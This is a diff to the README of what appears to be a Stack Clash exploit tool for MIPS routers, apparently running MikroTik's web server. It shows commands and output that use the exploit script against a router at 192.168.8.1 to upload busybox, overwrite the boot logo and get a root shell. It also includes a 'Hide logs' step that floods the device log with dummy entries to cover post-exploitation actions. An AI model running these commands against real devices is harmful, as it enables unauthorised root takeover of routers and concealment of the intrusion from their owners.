@@ -132,7 +132,7 @@ Got root ;-)
 To upload `busybox-mips` in `/ram/busybox`  
 ```
 $ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
-$ ./StackClash_resock_mips.py 192.168.8.1 80 www_mipsbe busybox-mips /ram/busybox   
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary busybox-mips /ram/busybox   
 [...]   
 Uploading busybox-mips in /ram/busybox...   
 Upload done!
@@ -146,10 +146,25 @@ BusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.
 [...]
 ```
 
+### Change boot logo
+```
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary docs/logo.bmp /flash/boot/logo.bmp  
+[...]
+Uploading docs/logo.bmp in /flash/boot/logo.bmp...
+Upload done!
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+reboot
+*** Connection closed by remote host ***
+```
+
+
 ### Hide logs
 To remove logs after your post exploitation actions
 ```
-/ # /nova/bin/info "for i from=1 to=1000 do={ :log info message='Some dummy info' }"
+/ # /nova/bin/info ":for i from=1 to=1000 do={ :log info message='Some dummy info' }"
 ```
 
 # FAQ
